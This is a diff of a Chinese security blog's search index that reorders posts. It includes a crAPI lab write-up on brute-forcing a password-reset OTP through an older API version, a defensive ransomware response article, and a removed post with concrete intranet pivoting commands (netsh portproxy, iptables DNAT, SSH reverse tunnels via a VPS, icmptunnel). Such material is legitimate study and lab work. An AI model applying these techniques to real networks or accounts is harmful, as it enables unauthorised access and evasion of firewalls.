@@ -54,11 +54,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dockerpostgres</title>
-    <url>/posts/d8a3a561.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>linux下doker搭建crapi靶场渗透练习</title>
     <url>/posts/ad05d80f.html</url>
     <content><![CDATA[<h1 id="api测试小技巧"><a href="#api测试小技巧" class="headerlink" title="api测试小技巧"></a>api测试小技巧</h1><p>靶场内多个思路可从该文章内参考<br>摘: <a href="https://github.com/inonshk/31-days-of-API-Security-Tips">https://github.com/inonshk/31-days-of-API-Security-Tips</a><br>中文: <a href="https://cloud.tencent.com/developer/article/1805577">https://cloud.tencent.com/developer/article/1805577</a></p>
@@ -90,7 +85,7 @@
 <p>抓包携带authentication，内部修改id值可显示其他用户报告内容，并泄露机械师email、number用户车辆vin值、number等敏感信息<br><img src="/img/crapi/otherreport.png"></p>
 <h1 id="失效的用户身份验证"><a href="#失效的用户身份验证" class="headerlink" title="失效的用户身份验证"></a>失效的用户身份验证</h1><p>Broken User Authentication<br>API在访问时未对请求方进行身份验证或身份验证存在问题导致易被破解<br>如:<br>未校验令牌的有效性<br>更新密码接口未限制请求频率，旧密码参数可暴力破解<br>短信验证码或者邮箱验证码有效期超出 10 分钟或者长度小于 6 位</p>
 <h2 id="3-重置其他用户的密码"><a href="#3-重置其他用户的密码" class="headerlink" title="3.重置其他用户的密码"></a>3.重置其他用户的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">旧的API版本通常会包含更多的安全漏洞，他们缺乏一些安全机制。我们可以使用REST API的一些特征来预测是否存在旧的API版本。</span><br><span class="line">比如当前有一个API被命名为/api/v3/login ，我们可以检查/api/v1/login是否存在 。</span><br></pre></td></tr></table></figure>
-<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#x70;&#111;&#x67;&#x62;&#97;&#x30;&#x30;&#54;&#64;&#101;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#x6f;&#109;">&#x70;&#111;&#x67;&#x62;&#97;&#x30;&#x30;&#54;&#64;&#101;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#x6f;&#109;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
+<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#x70;&#x6f;&#103;&#98;&#97;&#x30;&#48;&#x36;&#x40;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#101;&#46;&#x63;&#x6f;&#x6d;">&#x70;&#x6f;&#103;&#98;&#97;&#x30;&#48;&#x36;&#x40;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#101;&#46;&#x63;&#x6f;&#x6d;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
 <p>发送多次后发现存在爆破次数上限<br><img src="/img/crapi/otpattackerrorbp.png"><br>查看接口发现存在v3，判断是否存在历史版本接口v1或v2(v1经验证不存在，v2未对爆破次数作限制)<br><img src="/img/crapi/otpattacksuccessbp.png"><br>经爆破otp验证码未6216，尝试修改密码后登录成功<br><img src="/img/crapi/loginsuccess.png"></p>
 <h1 id="过度数据暴露"><a href="#过度数据暴露" class="headerlink" title="过度数据暴露"></a>过度数据暴露</h1><p>Excessive Data Exposure<br>过度数据暴露是一种安全漏洞，当您的前端请求的数据超过预期时就会发生这种情况。在 Web 应用程序中，任何人都可以打开浏览器开发人员工具并检查传入和传出的 HTTP 请求。他们可以看到从这些请求中收到的数据负载。<br>因此，即使前端不一定使用或消费这些数据，攻击者仍然可以通过 API 调用查看这些数据。如果 API 发送的数据比前端需要的敏感数据多，攻击者就可以利用这些数据对用户造成损害。<br>这被称为过度数据暴露。在过度数据暴露中，暴露的敏感数据实际上比任何人可以访问的数据都要多。</p>
 <h2 id="4-其他用户敏感信息api接口"><a href="#4-其他用户敏感信息api接口" class="headerlink" title="4.其他用户敏感信息api接口"></a>4.其他用户敏感信息api接口</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br><img src="/img/crapi/bolabp.png"></p>
@@ -128,6 +123,11 @@
       <tags>
         <tag>API安全</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>dockerpostgres</title>
+    <url>/posts/d8a3a561.html</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>容器服务启动失败</title>
@@ -206,6 +206,27 @@
       <tags>
         <tag>hexo魔改</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>lesuo</title>
+    <url>/posts/4fea4d13.html</url>
+    <content><![CDATA[<h2 id="第3篇：勒索病毒"><a href="#第3篇：勒索病毒" class="headerlink" title="第3篇：勒索病毒"></a>第3篇：勒索病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​	勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p>
+<h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​	某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p>
+<p><img src="/img/lesuo/win-7-1.png"></p>
+<h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​	登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p>
+<p><img src="/img/lesuo/win-7-2.png"></p>
+<p>打开!HELP_SOS.hta文件，显示如下： </p>
+<p><img src="/img/lesuo/win-7-3.png"></p>
+<p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。">http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</a></p>
+<p><img src="/img/lesuo/win-7-4.png"></p>
+<p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 </p>
+<p>遇到了，别急，试一试勒索病毒解密工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">360安全卫士勒索病毒专题</span><br><span class="line">http://lesuobingdu.360.cn</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​	一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br><span class="line">4、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line">5、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
   <entry>
     <title>mongodb-nosql注入</title>
@@ -378,25 +399,18 @@
       </tags>
   </entry>
   <entry>
-    <title>lesuo</title>
-    <url>/posts/4fea4d13.html</url>
-    <content><![CDATA[<h2 id="第3篇：勒索病毒"><a href="#第3篇：勒索病毒" class="headerlink" title="第3篇：勒索病毒"></a>第3篇：勒索病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​	勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p>
-<h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​	某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p>
-<p><img src="/image/win-7-1.png"></p>
-<h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​	登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p>
-<p><img src="/image/win-7-2.png"></p>
-<p>打开!HELP_SOS.hta文件，显示如下： </p>
-<p><img src="/image/win-7-3.png"></p>
-<p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。">http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</a></p>
-<p><img src="/image/win-7-4.png"></p>
-<p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 </p>
-<p>遇到了，别急，试一试勒索病毒解密工具：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">360安全卫士勒索病毒专题</span><br><span class="line">http://lesuobingdu.360.cn</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​	一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br><span class="line">4、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line">5、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure>
-
+    <title>npm更新报错</title>
+    <url>/posts/63beea23.html</url>
+    <content><![CDATA[<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p>1.更新npm可能node版本不一致，导致命令无法使用<br>2.在 <a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a> 内可查看node对应的npm版本<br>3.npm -g install npm @npm 安装指定npm版本号<br>4.若出现报错说明npm存在旧的npm缓存，或旧的npm环境，需将之前C盘Roaming下的npm，npm-cache两个文件删除<br>5.删除之后重新执行npm -g install npm @npm版本号<br>6.再次查看npm版本确认是否更换完成</p>
+<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;npm install -g npm</span><br><span class="line">npm ERR! code EBADENGINE</span><br><span class="line">npm ERR! engine Unsupported engine</span><br><span class="line">npm ERR! engine Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Required: &#123;&quot;node&quot;:&quot;^18.17.0 || &gt;=20.5.0&quot;&#125;</span><br><span class="line">npm ERR! notsup Actual:   &#123;&quot;npm&quot;:&quot;8.1.2&quot;,&quot;node&quot;:&quot;v16.13.1&quot;&#125;</span><br><span class="line"></span><br><span class="line">npm ERR! A complete log of this run can be found in:</span><br><span class="line">npm ERR!     C:\Users\Daiyamondo\AppData\Local\npm-cache\_logs\2024-10-24T06_31_00_310Z-debug.log</span><br></pre></td></tr></table></figure>
+<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;,npm install --force -g npm</span><br><span class="line">npm WARN using --force Recommended protections disabled.</span><br><span class="line">npm WARN install Forcing global npm install with incompatible version 10.9.0 into node v16.13.1</span><br><span class="line"></span><br><span class="line">added 3 packages in 5s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>报错</category>
+      </categories>
+      <tags>
+        <tag>npm报错</tag>
+      </tags>
   </entry>
   <entry>
     <title>pyenv 简单使用记录</title>
@@ -562,20 +576,6 @@
       </tags>
   </entry>
   <entry>
-    <title>npm更新报错</title>
-    <url>/posts/63beea23.html</url>
-    <content><![CDATA[<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p>1.更新npm可能node版本不一致，导致命令无法使用<br>2.在 <a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a> 内可查看node对应的npm版本<br>3.npm -g install npm @npm 安装指定npm版本号<br>4.若出现报错说明npm存在旧的npm缓存，或旧的npm环境，需将之前C盘Roaming下的npm，npm-cache两个文件删除<br>5.删除之后重新执行npm -g install npm @npm版本号<br>6.再次查看npm版本确认是否更换完成</p>
-<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;npm install -g npm</span><br><span class="line">npm ERR! code EBADENGINE</span><br><span class="line">npm ERR! engine Unsupported engine</span><br><span class="line">npm ERR! engine Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Required: &#123;&quot;node&quot;:&quot;^18.17.0 || &gt;=20.5.0&quot;&#125;</span><br><span class="line">npm ERR! notsup Actual:   &#123;&quot;npm&quot;:&quot;8.1.2&quot;,&quot;node&quot;:&quot;v16.13.1&quot;&#125;</span><br><span class="line"></span><br><span class="line">npm ERR! A complete log of this run can be found in:</span><br><span class="line">npm ERR!     C:\Users\Daiyamondo\AppData\Local\npm-cache\_logs\2024-10-24T06_31_00_310Z-debug.log</span><br></pre></td></tr></table></figure>
-<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;,npm install --force -g npm</span><br><span class="line">npm WARN using --force Recommended protections disabled.</span><br><span class="line">npm WARN install Forcing global npm install with incompatible version 10.9.0 into node v16.13.1</span><br><span class="line"></span><br><span class="line">added 3 packages in 5s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>报错</category>
-      </categories>
-      <tags>
-        <tag>npm报错</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shiro反序列化漏洞(CVE-2016-4437)复现</title>
     <url>/posts/79c4731b.html</url>
     <content><![CDATA[<p>摘:<a href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p>
@@ -599,6 +599,18 @@
       </categories>
       <tags>
         <tag>shiro反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs靶场练习</title>
+    <url>/posts/d642dfa0.html</url>
+    <content><![CDATA[<p>虽然之前通关过一次但已历史久远，未来如果有机会再来一次的话我一定截图</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>sql-inject</tag>
       </tags>
   </entry>
   <entry>
@@ -713,18 +725,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs靶场练习</title>
-    <url>/posts/d642dfa0.html</url>
-    <content><![CDATA[<p>虽然之前通关过一次但已历史久远，未来如果有机会再来一次的话我一定截图</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>sql-inject</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web认证机制与攻击方式</title>
     <url>/posts/65c9aba7.html</url>
     <content><![CDATA[<p><a href="https://websec.readthedocs.io/zh/latest/auth/index.html">https://websec.readthedocs.io/zh/latest/auth/index.html</a></p>
@@ -741,46 +741,6 @@
       </categories>
       <tags>
         <tag>认证机制与攻击</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网隧道搭建</title>
-    <url>/posts/d57d5540.html</url>
-    <content><![CDATA[<h1 id="网络连通性测试"><a href="#网络连通性测试" class="headerlink" title="网络连通性测试"></a>网络连通性测试</h1><h2 id="icmp探测"><a href="#icmp探测" class="headerlink" title="icmp探测"></a>icmp探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1	#Windows</span><br><span class="line">ping 114.114.114.114 -c 1	#Linux</span><br></pre></td></tr></table></figure>
-<h2 id="http探测"><a href="#http探测" class="headerlink" title="http探测"></a>http探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
-<h2 id="dns探测"><a href="#dns探测" class="headerlink" title="dns探测"></a>dns探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
-<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>服务器可出网<br>反向代理可穿透防火墙<br>cobaltstrike socks代理<br>nps工具</p>
-<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="windows-netsh-端口转发-双网卡"><a href="#windows-netsh-端口转发-双网卡" class="headerlink" title="windows netsh 端口转发 双网卡"></a>windows netsh 端口转发 双网卡</h2><p>netsh仅支持tcp协议，适用于双网卡服务器<br>启动转发</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看已有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">添加转发规则 访问外网ip1234端口即访问内网ip端口3389</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 </span><br></pre></td></tr></table></figure>
-<p>取消转发</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=1234</span><br><span class="line"></span><br><span class="line"># xp需安装ipv4</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
-<h2 id="linux-iptables-转发-高权限"><a href="#linux-iptables-转发-高权限" class="headerlink" title="linux iptables 转发 高权限"></a>linux iptables 转发 高权限</h2><p>编辑配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启IP转发</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
-<p>关闭服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>
-<p>配置规则</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure>
-<p>保存并重启服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
-<h2 id="neo-regeorg端口复用"><a href="#neo-regeorg端口复用" class="headerlink" title="neo-regeorg端口复用"></a>neo-regeorg端口复用</h2><p>下载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
-<h1 id="linux-ssh隧道-高权限"><a href="#linux-ssh隧道-高权限" class="headerlink" title="linux ssh隧道 高权限"></a>linux ssh隧道 高权限</h1><h2 id="本地转发-正向"><a href="#本地转发-正向" class="headerlink" title="本地转发 正向"></a>本地转发 正向</h2><p>vps执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@目标外网Web服务器，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure>
-<h2 id="远程转发-反向"><a href="#远程转发-反向" class="headerlink" title="远程转发 反向"></a>远程转发 反向</h2><p>web服务器执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@VPS-IP，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure>
-<h1 id="icmp加密隧道"><a href="#icmp加密隧道" class="headerlink" title="icmp加密隧道"></a>icmp加密隧道</h1><p>icmp可出网</p>
-<p>linux: icmptunnel<br>服务端安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel/</span><br><span class="line">make</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1	#禁用自带的ICMP，两端都要</span><br><span class="line">./icmptunnel -s 							#服务端以root用户监听</span><br><span class="line">(ctrl-z)									</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.1 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
-<p>客户端连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./icmptunnel &lt;server-IP&gt;</span><br><span class="line">(ctrl-z)</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.2 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
-<p>测试ssh连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.1</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Intranet安全</category>
-      </categories>
-      <tags>
-        <tag>内网穿透</tag>
       </tags>
   </entry>
   <entry>
@@ -1052,37 +1012,6 @@
       </categories>
       <tags>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浏览器加载流程</title>
-    <url>/posts/1c025fc.html</url>
-    <content><![CDATA[<p>摘: <a href="https://www.cnblogs.com/ryanzheng/p/18284643">https://www.cnblogs.com/ryanzheng/p/18284643</a></p>
-<h1 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h1><p>用户访问URL: <a href="https://example.com/index/about?query=1">https://example.com/index/about?query=1</a></p>
-<h1 id="浏览器解析"><a href="#浏览器解析" class="headerlink" title="浏览器解析"></a>浏览器解析</h1><p>提取访问URL的协议(https),域名(example.com),路径(&#x2F;index&#x2F;about)和查询参数(query)</p>
-<h1 id="检查缓存"><a href="#检查缓存" class="headerlink" title="检查缓存"></a>检查缓存</h1><p>检查本地缓存是否有该域名的ip地址,如果有则使用缓存的ip地址</p>
-<h1 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h1><h2 id="什么是DNS缓存"><a href="#什么是DNS缓存" class="headerlink" title="什么是DNS缓存"></a>什么是DNS缓存</h2><p>在域名系统 (DNS) 中，缓存是在操作系统、浏览器、设备或网络中临时存储 DNS 记录的过程<br>DNS 记录用于将人类可读的域名(例如,example.com)转换为计算机和设备可以理解的对应 IP 地址，例如 2001:db8:3e8:2a3::b63<br>通过在本地存储 DNS 信息,DNS 缓存使域名能够更快地被转换或”解析”，同时可以减少网络流量</p>
-<h2 id="DNS缓存顺序"><a href="#DNS缓存顺序" class="headerlink" title="DNS缓存顺序"></a>DNS缓存顺序</h2><p>浏览器缓存:浏览器检查缓存是否有该域名ip地址<br>操作系统缓存:如若浏览器没有,浏览器向操作系统查询<br>本地dns服务器:操作系统缓存没有,则向配置的本地dns服务器发送查询请求<br>递归查询:本地 DNS 服务器会递归查询其他 DNS 服务器，直到找到该域名对应的 IP 地址<br>返回结果:DNS 服务器将结果返回给操作系统，再由操作系统返回给浏览器</p>
-<h1 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h1><h2 id="三次握手-TCP连接"><a href="#三次握手-TCP连接" class="headerlink" title="三次握手(TCP连接)"></a>三次握手(TCP连接)</h2><p>SYN:客户端发送至服务端请求连接<br>SYN-ACK:服务端收到回复确认表示同意连接<br>ACK:客户端确认回复并建立连接</p>
-<h2 id="TLS-SSL握手-HTTPS"><a href="#TLS-SSL握手-HTTPS" class="headerlink" title="TLS&#x2F;SSL握手(HTTPS)"></a>TLS&#x2F;SSL握手(HTTPS)</h2><p>客户端问候:客户端发送一个 ClientHello 消息,包含支持的加密算法、TLS 版本等信息<br>服务器问候:服务器回复一个 ServerHello 消息,选择加密算法和 TLS 版本,并发送服务器证书<br>证书验证:客户端验证服务器证书的有效性<br>密钥交换:客户端生成一个随机数,用服务器的公钥加密后发送给服务器，服务器用私钥解密，生成会话密钥<br>完成握手:双方使用会话密钥加密通信,握手完成</p>
-<h1 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h1><h2 id="构建请求"><a href="#构建请求" class="headerlink" title="构建请求"></a>构建请求</h2><p>浏览器构建一个 HTTP 请求，包括请求行(如 GET&#x2F;HTTP&#x2F;1.1)、请求头(如 Host: <a href="http://www.example.com)和可选的请求体/">www.example.com)和可选的请求体</a>(如 POST 请求的数据)</p>
-<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p>浏览器通过建立的 TCP 连接将 HTTP 请求发送到服务器</p>
-<h1 id="服务器处理请求"><a href="#服务器处理请求" class="headerlink" title="服务器处理请求"></a>服务器处理请求</h1><p>接收请求：服务器接收到 HTTP 请求<br>请求解析：服务器解析请求行、请求头和请求体<br>路由处理：服务器根据请求的路径和参数，确定处理请求的逻辑<br>业务逻辑：服务器执行相应的业务逻辑，可能涉及读取文件、查询数据库、调用其他服务等<br>生成响应：服务器生成一个 HTTP 响应，包括状态行(如 HTTP&#x2F;1.1 200 OK)、响应头(如 Content-Type: text&#x2F;html)和响应体(如 HTML 内容)</p>
-<h1 id="浏览器接收响应"><a href="#浏览器接收响应" class="headerlink" title="浏览器接收响应"></a>浏览器接收响应</h1><p>接收响应<br>浏览器接收服务器响应<br>解析响应<br>浏览器解析响应头和响应体</p>
-<h1 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h1><h2 id="解析html"><a href="#解析html" class="headerlink" title="解析html"></a>解析html</h2><p>构建DOM树 解析HTML文档，构建DOM树<br>处理脚本 遇到&lt; script &gt;标签浏览器会暂停解析，执行脚本，脚本可能修改DOM树</p>
-<h2 id="解析css"><a href="#解析css" class="headerlink" title="解析css"></a>解析css</h2><p>构建CSSOM树 解析css文件和内联样式，构建css object model树</p>
-<h2 id="解析javascript"><a href="#解析javascript" class="headerlink" title="解析javascript"></a>解析javascript</h2><p>执行脚本 解析和执行JavaScript代码，可能修改dom树和cssom树</p>
-<h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>结合dom和cssom</p>
